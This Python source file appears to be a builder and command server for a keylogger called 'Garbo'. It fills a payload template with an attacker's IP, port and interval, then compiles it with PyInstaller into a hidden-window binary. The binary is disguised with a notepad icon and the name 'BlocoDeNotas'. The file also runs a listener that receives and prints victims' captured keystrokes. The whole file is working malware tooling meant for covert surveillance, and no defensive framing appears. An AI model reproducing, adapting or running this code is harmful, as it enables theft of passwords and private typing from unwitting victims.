import os
import shutil
import stat
import sys
import socket
import json
import threading
from pyfiglet import figlet_format
from rich.console import Console
from rich.text import Text

console = Console()

TEMPLATE_PATH = "payload_template.py"
OUTPUT_PATH = "payload_gerado.py"
HOST = '0.0.0.0'
PORT = 8080

def banner():
    ascii_text = figlet_format("Garbo")
    linhas = ascii_text.splitlines()

    def gerar_tom_verde(n, total):
        start = 50
        end = 180
        valor = int(start + (end - start) * (n / max(total - 1, 1)))
        return f"rgb(0,{valor},0)"

    for i, linha in enumerate(linhas):
        cor = gerar_tom_verde(i, len(linhas))
        texto_colorido = Text(linha, style=cor)
        console.print(texto_colorido)

def limpar_pastas():
    for pasta in ["build", "dist"]:
        if os.path.exists(pasta):
            shutil.rmtree(pasta)
    for arquivo in ["payload_gerado.spec", "payload_gerado.py"]:
        if os.path.exists(arquivo):
            os.remove(arquivo)
    if os.path.exists("payload_gerado.spec"):
        os.remove("payload_gerado.spec")

def print_sucesso(msg):
    console.print(f"[+] {msg}", style="bold green")

def print_erro(msg):
    console.print(f"[-] {msg}", style="red")

def gerar_payload(ip, port, interval):
    with open(TEMPLATE_PATH, "r", encoding="utf-8") as f:
        template = f.read()

    script_final = (
        template.replace("{{IP}}", ip)
                .replace("{{PORT}}", str(port))
                .replace("{{INTERVAL}}", str(interval))
    )

    with open(OUTPUT_PATH, "w", encoding="utf-8") as f:
        f.write(script_final)

    print_sucesso("Payload personalizado criado com sucesso.")

def finalizar_compilacao(dist_dir="dist", nome_bin="payload_gerado", nome_final="BlocoDeNotas"):
    final_bin = os.path.join(dist_dir, nome_bin)
    if os.path.exists(final_bin):
        shutil.move(final_bin, f"./{nome_final}")
        st = os.stat(f"./{nome_final}")
        os.chmod(f"./{nome_final}", st.st_mode | stat.S_IEXEC)
        print_sucesso(f"Binário gerado e pronto para executar \n[INFO] Nome: {nome_final}")
    else:
        print_erro(f"Erro na compilação. Arquivo não encontrado: {final_bin}")

def compilar_payload():
    print("[*] Compilando com pyinstaller...")
    cmd = f"{sys.executable} -m PyInstaller --noconfirm --onefile --noconsole --icon=notepad.ico {OUTPUT_PATH}"
    os.system(cmd)

    finalizar_compilacao()

def format_text(raw_text):
    replacements = {
        "Key.space": " ",
        "Key.enter": "[ENTER]",
        "Key.tab": "\t",
        "Key.backspace": "[BACKSPACE]",
        "Key.shift": "",
        "Key.shift_r": "",
        "Key.ctrl_l": "",
        "Key.ctrl_r": "",
        "Key.alt_l": "",
        "Key.alt_r": "",
        "Key.esc": "[ESC]",
    }

    words = raw_text.strip().split()
    result = []
    for w in words:
        if w in replacements:
            result.append(replacements[w])
        elif w.startswith("Key."):
            result.append(f"[{w[4:].upper()}]")
        else:
            result.append(w)
    return "".join(result)

def start_server():
    console.print(f"[+] Servidor escutando em {HOST}:{PORT}", style="bold green")

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST, PORT))
        s.listen()

        while True:
            conn, addr = s.accept()
            with conn:
                console.print(f"[+] Conexão recebida de {addr[0]}:{addr[1]}", style="bold green")
                data = conn.recv(4096)

                if not data:
                    continue

                try:
                    payload = json.loads(data.decode())
                    raw_text = payload.get("keyboardData", "")
                    clean_text = format_text(raw_text)
                    console.print("[*] Texto formatado:", style="bold cyan")
                    console.print(clean_text)
                except json.JSONDecodeError:
                    print_erro("Erro ao decodificar JSON")

def main():
    banner()
    ip = input("[>]Digite o IP para envio dos dados: ").strip()
    port = input("[>]Digite a porta: ").strip()
    interval = input("[>]Intervalo (em segundos): ").strip()

    gerar_payload(ip, port, interval)
    compilar_payload()
    print_sucesso("[INFO] Iniciando servidor para capturar dados do keylogger")
    limpar_pastas()
    threading.Thread(target=start_server, daemon=True).start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print_erro("Servidor encerrado pelo usuário.")

if __name__ == "__main__":
    main()
